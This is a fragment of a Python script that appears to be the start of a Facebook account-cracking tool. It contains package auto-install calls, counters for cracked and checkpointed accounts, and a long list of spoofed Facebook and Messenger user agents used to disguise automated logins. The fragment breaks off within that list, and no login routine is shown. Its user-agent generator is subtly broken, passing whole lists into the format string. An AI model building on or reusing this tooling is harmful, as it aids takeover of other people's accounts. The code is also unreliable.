#-----------------------❲ IMPORT ❳-----------------------#
import os,zlib
from os import system as osRUB
from os import system as cmd
#-----------------------❲ MISSING MODELS ❳-----------------------#
try:
    import requests 
except ImportError:
    print('❲•❳ INSTALLING REQUESTS');os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('❲•❳  INSTALLING FUTURES ');os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
#-----------------------❲ MODELS ❳-----------------------#
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as SHUVOxd
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#-----------------------❲ LOOP ❳-----------------------#
totaldmp = 0;count = 0;loop = 0;oks = [];cps = [];id = [];ps = [];sid = [];total=[];methods = [];srange = 0;saved = [];totaldmp = 0;filter = [];user=[]
#-----------------------❲ GRAPH & API USER AGENT ❳-----------------------#
import random

def generate_random_user00_agent():
    for _ in range(100):
        user_agent_template = (
            '[FBAN/FB4A;FBAV/{version};FBBV/{version_code};FBDM/{device_density};FBLC/{language};FBRV/{revision};'
            'FBCR/{carrier};FBMF/{manufacturer};FBBD/{brand};FBPN/{package};FBDV/{device};FBSV/{os_version};'
            'FBOP/{op};FBCA/{cpu_architecture};SIM/{sim_name};MODEL/{model_name};]')

    version = random.choice(["332.0.0.22.108", "375.0.0.7.111", "375.0.0.7.111", "342.1.0.14.119", "375.0.0.7.111"])
    version_code = random.choice(["426325710", "519821535", "522056763", "339015011", "522056759"])
    device_density = f"{random.choice(['3.0', '1.75', '2.0', '2.625', '3.5', '1.5', '4.0'])}"
 # Example: Set to a specific language code  
    language = ["en_AU", "en_GB", "in_ID", "pt_BR", "pt_PT", "fr_FR", "th_TH", "es_MX", "en_EG", "en_PH", "hu_HU", "vi_VN", "en_GB", "en_ZA", "tr_TR"]
  # Example: Set revision number if applicable
    revision = ["200000000, 599999999"]
   # Example: Set carrier name
    carrier = (["YES OPTUS", "Telstra", "VIVO", "O2.CZ", "Unitel STP","O2-CZ","airtel","Beeline","MegaFon","T-Mobile","Tele2 LT","Three","Beeline","MegaFon"])

    manufacturer ="samsung", "OPPO", "HUAWEI", "Xiaomi", "TECNO", "HUAWEI", "LGE", "Vivo", "Hisense", "Sony"
    brand = ["samsung", "OPPO", "HUAWEI", "Xiaomi", "TECNO", "HUAWEI", "LGE", "Vivo", "Hisense", "Sony"]
    package = (["com.facebook.orca", "com.facebook.katana", "com.miniclip.carrom"])
    device = ("SM-T835", "CPH2385", "RNE-L22", "GT-S7560M", "LM-X210", "GT-I9505", "Hisense-Hi-3", "SM-A515F", "ATU-L31", "HUAWEI LUA-L21", "Lenovo A6020a46", "FIG-LX1", "Kirin Treble", 
       "SM-S111DL", "SM-J410", "YAL-L21", "925F", "SM-G930F", "SM-J210F", "SM-A720F", "Z987", "MI 5X", "SM-G950U",
       "SM-G925F", "SM-N9005", "CPH1909", "SM-A205GN", "SM-A505GN", "AGS2-L09", "LML713DL", "LML414DL", "CPH1987", 
       "Hisense Hi 3", "LM-V405", "vivo V3Max", "POT-LX1", "SM-N975U", "SM-N960F", "A37f", "moto e6", "SM-G955F", 
       "DRA-LX2", "E6653", "GT-I9300")
    os_version = ["12", "10", "11", "8.0.0", "9", "13", "5.0.1", "8.0.0", "9.0.1", "4.4.4", "8.1.0", "5.1.1", "7.1.2", "9", "7.0", "10", "7.1.1", "4.0.4"]
    op = random.choice(["OkHttp3", "Orca-Android", "AudienceNetworkForAndroid"])
    cpu_architecture = random.choice(["armeabi-v7a:armeabi", "arm64-v8a", "armeabi-v7a:armeabi", "armeabi-v7a", "x86:armeabi-v7a"])

    # Randomly select SIM name and model name
    sim_name = random.choice([
        "Banglalink", "Robi", "MTN-CG", "Grameenphone", "Artel", "Teletalk", "UMobaile", "Digi",
        "Bouygues Telecom", "MegaFon", "Viettel Telecom", "TM", "GLOBE", "TELCEL", "TelkomSA",
        "U.S. Cellular", "null", "VIETTEL", "Verizon", "O2-CZ", "Metro by T-Mobile", "SUN"])
    model_name = random.choice(["Infinix X6516", "TECNO BF6", "CPH2385", "SM-T835", "TECNO BF6", "SM-A032F", "Leelbox", "ZTE", "RNE-L22", "GT-S7560M", "TECNO BF7", "SM-G988B", "moto g pure", "SM-A115F", "Infinix X6516", "TECNO BF6", "Redmi Note 8T", "SM-G780G", "SM-A032F", "CPH1923", "SM-G988B", "SM-G988B", "SM-G988B", "SM-G988B", "SM-G988B", "SM-A032F", "TECNO BF6", "CPH1923", "SM-G988B", "SM-G988B", "SM-G988B", "SM-G988B", "SM-A032F", "SM-A125F", "Infinix X6516", "TECNO BF7", "TECNO BF6", "TECNO KI5k", "TECNO BF7",
        "SM-G3518","SM-J320F","ASUS_Z016D","ATU-L31","SM-J530F","2499", "POCOPHONE F1", "CPH2083", "Xiaomi_Mi_Mix_10", "Redmi Note 7 Pro", "CPH2185", "CPH2065",
        "CPH2197", "CPH1989", "Redmi Note 8", "Redmi Note 9 Pro", "Redmi 8A", "MI PLAY", "OPPO A57", "CPH2145",
        "Mi Note 10 Lite", "MI PAD 4", "F1w", "Redmi 5 Plus", "CPH1909", "CPH2065", "CPH1937", "CPH2249",
        "CPH2095", "CPH2083", "CPH1979", "CPH2067", "CPH2015", "CPH2021", "CPH2205", "CPH2207", "CPH1909",
        "CPH1801", "CPH1911", "CPH1901", "CPH1727", "1201", "Xiaomi"])
    return user_agent_template.format(
        version=version,
        version_code=version_code,
        device_density=device_density,
        language=language,
        revision=revision,
        carrier=carrier,
        manufacturer=manufacturer,
        brand=brand,
        package=package,
        device=device,
        os_version=os_version,
        op=op,
        cpu_architecture=cpu_architecture,
        sim_name=sim_name,
        model_name=model_name)

predefined_user_agents = [
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/426325710;FBAV/332.0.0.22.108;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/519821535;FBAV/374.0.0.10.114;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; CPH2385 Build/SP1A.210812.016) [FBAN/EMA;FBBV/522056763;FBAV/375.0.0.7.111;FBDV/CPH2385;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-T835 Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/339015011;FBCR/YES OPTUS;FBMF/samsung;FBBD/samsung;FBDV/SM-T835;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1600,height=2452};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/522056759;FBAV/375.0.0.7.111;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/522056759;FBAV/375.0.0.7.111;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; Leelbox Build/PPR1.281373.396) [FBAN/FB4A;FBAV/271.0.0.55.109;FBBV/215365690;FBDM/{density=3.0,width=1080,height=2208};FBLC/en_GB;FBRV/216077496;FBCR/inwi;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1989;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; Z6356T Build/RP1A.201005.001) [FBAN/Orca-Android;FBAV/428.0.0.35.115;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/520514255;FBCR/Telstra;FBMF/ZTE;FBBD/ZTE;FBDV/Z6356T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.25,width=720,height=1466};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; Z6356T Build/RP1A.201005.001) [FBAN/Orca-Android;FBAV/428.0.0.35.115;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/520514424;FBCR/Telstra;FBMF/ZTE;FBBD/ZTE;FBDV/Z6356T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1476};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/523694232;FBAV/376.0.0.7.103;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; RNE-L22 Build/HUAWEIRNE-L22) [FBAN/Orca-Android;FBAV/426.0.0.27.102;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/515381945;FBCR/Telkomsel;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/RNE-L22;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2050};FB_FW/1;]", 
   "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-S7560M Build/IMM76I) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/14274145;FBCR/Bell;FBMF/samsung;FBBD/samsung;FBDV/GT-S7560M;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=800};FB_FW/1;]", 
   "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-S7560M Build/IMM76I) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/14274145;FBCR/Bell;FBMF/samsung;FBBD/samsung;FBDV/GT-S7560M;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=800};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/529276760;FBAV/378.0.0.12.118;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.miniclip.carrom;FBAV/15.2.0;FBBV/931;FBVS/6.16.0;FBLC/en_GB]", 
   "Dalvik/2.1.0 (Linux; U; Android 13.0; Samsung Galaxy S21 Build/OPR1.8610) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/Samsung Galaxy S21;FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/{density=3.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/531759371;FBAV/379.0.0.8.118;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/426325710;FBAV/332.0.0.22.108;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; SM-A725F Build/RP1A.200720.012) [FBAN/EMA;FBBV/531759373;FBAV/379.0.0.8.118;FBDV/SM-A725F;FBSV/11;FBCX/OkHttp3;FBDM/{density=2.8125}]", 
   "Dalvik/2.1.0+(Linux;+U;+Android+12;+TECNO+BF6+Build/SP1A.210812.001)+[FBAN/EMA;FBBV/534334734;FBAV/380.0.0.14.112;FBDV/TECNO+BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build/RKQ1.201004.002) [FBAN/Orca-Android;FBAV/433.0.0.32.117;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/532438891;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-4-9) [FBAN/EMA;FBBV/536599395;FBAV/381.0.0.8.100;FBDV/moto g pure;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/531759371;FBAV/379.0.0.8.118;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 9; CPH1923 Build/PPR1.180610.011) [FBAN/EMA;FBBV/536599416;FBAV/381.0.0.8.100;FBDV/CPH1923;FBSV/9;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-G780G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/435.0.0.32.108;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/537314828;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBDV/SM-G780G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2168};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/538547664;FBAV/382.0.0.11.115;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; itel A662L Build/SP1A.210812.016) [FBAN/EMA;FBBV/538547664;FBAV/382.0.0.11.115;FBDV/itel A662L;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; SM-A032F Build/RP1A.201005.001) [FBAN/EMA;FBBV/538547664;FBAV/382.0.0.11.115;FBDV/SM-A032F;FBSV/11;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO KI5k Build/SP1A.210812.016) [FBAN/EMA;FBBV/538547666;FBAV/382.0.0.11.115;FBDV/TECNO KI5k;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/543543184;FBAV/384.0.0.8.114;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-G988B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/437.0.0.26.230;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/543663526;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBDV/SM-G988B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2191};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-G988B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/437.0.0.26.230;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/543663526;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBDV/SM-G988B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2191};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-G988B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/437.0.0.26.230;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/543663526;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBDV/SM-G988B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2191};FB_FW/1;]",
   "[FBAN/FB4A;FBAV/443.0.0.23.229;FBBV/543547987;FBDM/{density=2.8125,width=1080,height=2191};FBLC/en_US;FBRV/545582941;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G988B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]",
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/543543178;FBAV/384.0.0.8.114;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/545357868;FBAV/385.0.0.11.112;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 9; CPH1923 Build/PPR1.180610.011) [FBAN/EMA;FBBV/545357871;FBAV/385.0.0.11.112;FBDV/CPH1923;FBSV/9;FBCX/OkHttp3;FBDM/{density=2.0}]",
   "Dalvik/2.1.0 (Linux; U; Android 12; CPH2477 Build/SP1A.210812.016) [FBAN/EMA;FBBV/545357871;FBAV/385.0.0.11.112;FBDV/CPH2477;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Nokia C02 Build/SP1A.210812.016) [FBAN/EMA;FBBV/543543178;FBAV/384.0.0.8.114;FBDV/Nokia C02;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; T431A Build/SP1A.210812.016) [FBAN/EMA;FBBV/545357868;FBAV/385.0.0.11.112;FBDV/T431A;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.5}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/545357868;FBAV/385.0.0.11.112;FBDV/TECNO;;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.5}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/547081839;FBAV/386.0.0.9.115;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/547081838;FBAV/386.0.0.9.115;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 7.1.2; LM-X210 Build/N2G47H) [FBAN/EMA;FBBV/538547664;FBAV/382.0.0.11.115;FBDV/LM-X210;FBLC/pt_BR;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/547081838;FBAV/386.0.0.9.115;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A125F Build/SP1A.210812.016) [FBAN/EMA;FBBV/549638571;FBAV/387.0.0.13.114;FBDV/SM-A125F;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.875}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/547081838;FBAV/386.0.0.9.115;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/549638571;FBAV/387.0.0.13.114;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/549638568;FBAV/387.0.0.13.114;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A115F Build/SP1A.210812.016) [FBAN/EMA;FBBV/549638568;FBAV/387.0.0.13.114;FBDV/SM-A115F;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.75}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/pt_PT;FBBV/548243055;FBCR/Unitel STP;FBMF/samsung;FBBD/samsung;FBDV/SM-A032F;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1459};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/551727967;FBAV/388.0.0.13.119;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-G770F Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/bg_BG;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G770F;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2163};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/551727965;FBAV/388.0.0.13.119;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032M Build/SP1A.210812.016) [FBAN/EMA;FBBV/551727965;FBAV/388.0.0.13.119;FBDV/SM-A032M;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; 2209116AG Build/TKQ1.221114.001) [FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/554361140;FBCR/Digi.Mobil;FBMF/Xiaomi;FBBD/Redmi;FBDV/2209116AG;FBSV/13;FBC;]",
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A235F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_US;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2199};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/553983682;FBAV/389.0.0.10.118;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-F936B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; 220733SG Build/SP1A.210812.016) [FBAN/EMA;FBBV/553983682;FBAV/389.0.0.10.118;FBDV/220733SG;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/553983682;FBAV/389.0.0.10.118;FBDV/Infinix]",
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO LG6n Build/SP1A.210812.016) [FBAN/EMA;FBBV/553983686;FBAV/389.0.0.10.118;FBDV/TECNO LG6n;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/553983686;FBAV/389.0.0.10.118;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO KI5k Build/SP1A.210812.016) [FBAN/EMA;FBBV/555771981;FBAV/390.0.0.8.116;FBDV/TECNO KI5k;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO KI5k Build/SP1A.210812.016) [FBAN/EMA;FBBV/555771981;FBAV/390.0.0.8.116;FBDV/TECNO KI5k;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 10; Redmi 8 MIUI/V12.5.2.0.QCNINXM) [FBAN/EMA;FBBV/555771981;FBAV/390.0.0.8.116;FBDV/Redmi 8;FBSV/10;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 10; Redmi 8 MIUI/V12.5.2.0.QCNINXM) [FBAN/EMA;FBBV/555771981;FBAV/390.0.0.8.116;FBDV/Redmi 9 PRO;FBSV/10;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/555771979;FBAV/390.0.0.8.116;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032M Build/SP1A.210812.016) [FBAN/EMA;FBBV/555771979;FBAV/390.0.0.8.116;FBDV/SM-A032M;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/vivo;]",
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/555771981;FBAV/390.0.0.8.116;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A235F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/436.0.0.45.111;FBPN/com.facebook.orca;FBLC/fr_GN;FBBV/541554436;FBCR/Orange GN;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2207};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A235F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/436.0.0.45.111;FBPN/com.facebook.orca;FBLC/fr_GN;FBBV/541554436;FBCR/Orange GN;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2207};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/558098441;FBAV/391.0.0.11.115;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/558098441;FBAV/391.0.0.11.115;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/Orca-Android;FBAV/299.0.0.12.112;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/199281912;FBCR/Maxcom;FBMF/samsung;FBBD/samsung;;FBDV/SM-G3518;FBDM/{density=1.0,width=720,=height=1200};FBSV/13.0.1;FBCA/armeabi-v7a:armeabi;]", 
   "Dalvik/1.6.0 (Linux; U; Android 13; SM-G3518 Build/JLS36C) [FBAN/Orca-Android;FBAV/299.0.0.12.112;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/199281912;FBCR/Maxcom;FBMF/samsung;FBBD/samsung;;FBDV/SM-G3518;FBDM/{density=1.0,width=720,=height=1200};FBSV/13.0.1;FBCA/armeabi-v7a:armeabi;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A125F Build/SP1A.210812.016) [FBAN/EMA;FBBV/549638571;FBAV/387.0.0.13.114;FBDV/SM-A125F;FBLC/ar_AR;FBNG/4G;FBMNT/METERED;FBDM/{density=1.75}]", 
